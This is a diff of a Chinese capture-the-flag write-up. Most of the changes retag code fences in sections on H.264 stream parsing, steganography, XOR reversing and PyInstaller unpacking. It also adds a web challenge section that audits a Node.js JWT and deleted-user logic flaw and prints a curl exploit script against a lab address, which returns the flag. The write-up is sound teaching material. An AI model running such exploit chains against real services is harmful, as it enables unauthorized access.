@@ -494,13 +494,13 @@ kind = payload[0] & 0x1F
 
 Annex-B H.264 字节流使用起始码分隔 NAL。本脚本在每个完整 NAL 前加入：
 
-```text
+```plain
 00 00 00 01
 ```
 
 单 NAL 负载可以整体写出。STAP-A 的格式为：
 
-```text
+```plain
 STAP-A 指示字节 | 长度1（2字节） | NAL1 | 长度2（2字节） | NAL2 | ...
 ```
 
@@ -537,7 +537,7 @@ H.264、968×844、58 帧.
 
 ![alt text](./assets/m01.0030.png)
 
-```text
+```plain
 flag1 is 'flag{3b3a9c08-'
 hint:it's not just flag!!!
 ```
@@ -657,14 +657,14 @@ payload = np.packbits(bits, bitorder='big').tobytes()
 
 第一个字节取前两个像素的全部 RGB 最低位，以及第三个像素的 R、G 最低位。
 
-```text
+```plain
 R0 G0 B0 R1 G1 B1 R2 G2
  0  1  1  0  0  1  1  0
 ```
 
 因此第一个字节为
 
-```text
+```plain
 01100110₂ = 0x66 = ASCII 字符 f
 ```
 
@@ -922,7 +922,7 @@ return 0;
 
 每个位置满足：
 
-```text
+```plain
 input[i] XOR i = target[i]
 ```
 
@@ -930,7 +930,7 @@ input[i] XOR i = target[i]
 
 例如前五位：
 
-```text
+```plain
 0x66 XOR 0x00 = 0x66 = f
 0x6D XOR 0x01 = 0x6C = l
 0x63 XOR 0x02 = 0x61 = a
@@ -960,7 +960,7 @@ input[i] XOR i = target[i]
 
 标准 CArchive cookie 的 8 字节魔数为：
 
-```text
+```plain
 4d 45 49 0c 0b 0a 0b 0e    MEI.....
 ```
 
@@ -968,7 +968,7 @@ input[i] XOR i = target[i]
 
 但注意到：
 
-```text
+```plain
 73 77 49 0c 0b 0a 0b 0e    swI.....
 ```
 
@@ -998,7 +998,7 @@ struct.unpack('!8sIIII64s', cookie_bytes)
 
 归档起点为：
 
-```text
+```plain
 archive_start = cookie_offset + 88 - package_length
               = 0xA0C333 + 0x58 - 0xA03107
               = 0x9284
@@ -1019,7 +1019,7 @@ struct.unpack_from('!IIIIBc', blob, position)
 
 提取出的关键脚本项为：
 
-```text
+```plain
 s ooops 1650
 ```
 
@@ -1031,7 +1031,7 @@ s ooops 1650
 
 使用 [r03_inspect_code.py](./assets/r03_inspect_code.py) 的自定义 marshal 读取器，把代码对象解析成普通字典。它读取 Python 3.5 的代码对象字段：
 
-```text
+```plain
 argcount, kwonlyargcount, nlocals, stacksize, flags
 code, consts, names, varnames, freevars, cellvars
 filename, name, firstlineno, lnotab
@@ -1046,14 +1046,14 @@ filename, name, firstlineno, lnotab
 
 模块的名称表为：
 
-```text
+```plain
 ('sys', 'struct', 'zlib', 'ctypes',
  'anti_debug', 'decrypt_flag', 'main', '__name__')
 ```
 
 开头四条指令的字节形式是：
 
-```text
+```plain
 0:  77 00 00
 3:  77 01 00
 6:  90 00 00
@@ -1062,7 +1062,7 @@ filename, name, firstlineno, lnotab
 
 结合常量 0、None 和名称 `sys`，可将其解释为典型模块导入结构：
 
-```text
+```plain
 LOAD_CONST 0
 LOAD_CONST None
 IMPORT_NAME sys
@@ -1099,13 +1099,13 @@ STORE_NAME sys
 
 密钥：
 
-```text
+```plain
 c63b33cea0bdcf48794b4f9b2a19b2bf
 ```
 
 密文包：
 
-```text
+```plain
 3200000053ff072f19cb663f40d4bea77805f7f133e933c904b6005737b00ff3602c4670e6611fc7b8d3061b3b1faf73c807e9708408
 ```
 
@@ -1115,7 +1115,7 @@ c63b33cea0bdcf48794b4f9b2a19b2bf
 
 `decrypt_flag` 使用到两个整数常量：
 
-```text
+```plain
 57005 = 0xDEAD
 48879 = 0xBEEF
 ```
@@ -1153,7 +1153,7 @@ data = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 这一步之后得到有效的 zlib 数据：
 
-```text
+```plain
 789c4bcb494caf0e4a2d4b2d2a4e8d0fc9c82c8e0fcd29294a8cf7482c4a8977ce48ccc949cd4b4f555454ac050066480ff0
 ```
 
@@ -1205,7 +1205,7 @@ assert encrypt(flag, key) == encrypted
 ```
 
 
-```text
+```plain
 Key: c63b33cea0bdcf48794b4f9b2a19b2bf
 Flag: flag{Reverse_This_Ultra_Hard_Challenge!!!}
 Exact encryption round trip: PASS
@@ -1213,3 +1213,99 @@ Exact encryption round trip: PASS
 
 solve 脚本：[r03_solve.py](./assets/r03_solve.py) 
 
+
+
+## Web 方向
+
+### 01. Profile
+
+#### 初步分析
+
+直接访问，index.html 给出提示
+
+```html
+<html><body>欢迎使用</body>
+<!--/source-->
+</html>
+```
+
+访问 `/source`, 即可拿到后端源码 `app.js`。
+
+#### 审计源码
+
+注意到：
+
+```js
+const flag  = process.env.FLAG || "flag{fake_flag}";
+const jwtKey = Math.random().toString();
+
+class UserStore {
+    get(uid) { return this.users[uid] ?? {}; }    // !!!!!!!查不到 uid 时回退成空对象 {}
+    remove(uid) { /* 从 this.users 删除该用户 */ }
+}
+
+// 鉴权中间件：只验 JWT 签名，不校验用户是否仍存在
+app.use((req, res, next) => {
+    try {
+        res.locals.user = jwt.verify(req.cookies.token, jwtKey, { algorithms: ["HS256"] });
+    } catch (err) { /* ... */ }
+    next();
+});
+
+app.get("/profile", (req, res) => {
+    if (!res.locals.user) { res.status(401).send("请先登录"); return; }
+    const user = users.get(res.locals.user.uid);
+    res.send(user.restricted ? user.profile : flag);   // !!!!!! restricted 为假即返回 flag
+});
+
+app.post("/delete", (req, res) => {
+    if (res.locals.user) { users.remove(res.locals.user.uid); }
+    res.clearCookie("token");
+    res.send("已成功删除该用户");
+});
+```
+
+存在漏洞链：
+
+1. JWT 无状态：中间件只验证签名，不检查 `uid` 对应的用户是否还在。用户被删除后，旧 JWT 依然能通过验签。
+2. 回退空对象：`users.get(uid)` 对已删除的 `uid` 返回 `this.users[uid] ?? {}`，即 `{}`。
+3. 判断缺陷：`/profile` 用 `user.restricted ? user.profile : flag`。空对象 `{}` 的 `.restricted` 是 `undefined`（falsy），于是走 else 分支直接返回 flag。
+
+#### 利用
+
+直接 Curl 即可:
+
+```bash
+BASE="http://172.31.31.254:52953"
+UNAME="u123456"
+HEADERS=$(mktemp)
+trap 'rm -f "$HEADERS"' EXIT
+
+curl -sS --max-time 20 -D "$HEADERS" \
+  --data-urlencode "username=$UNAME" \
+  --data-urlencode 'password=p' \
+  -w '\nHTTP %{http_code}\n' \
+  "$BASE/register"
+
+TOKEN=$(sed -nE \
+  's/^[Ss][Ee][Tt]-[Cc][Oo][Oo][Kk][Ii][Ee]:[[:space:]]*token=([^;[:space:]]+).*/\1/p' \
+  "$HEADERS" | head -n 1)
+
+printf 'Token: %s\n' "$TOKEN"
+
+curl -sS --max-time 20 -X POST \
+  --cookie "token=$TOKEN" \
+  -w '\nHTTP %{http_code}\n' \
+  "$BASE/delete"
+
+curl -sS --max-time 20 \
+  --cookie "token=$TOKEN" \
+  -w '\nHTTP %{http_code}\n' \
+  "$BASE/profile"
+```
+
+直接拿到 Flag 响应：
+
+```plain
+flag{bdaf96f6f3403be1720938ef20ccac34}
+```
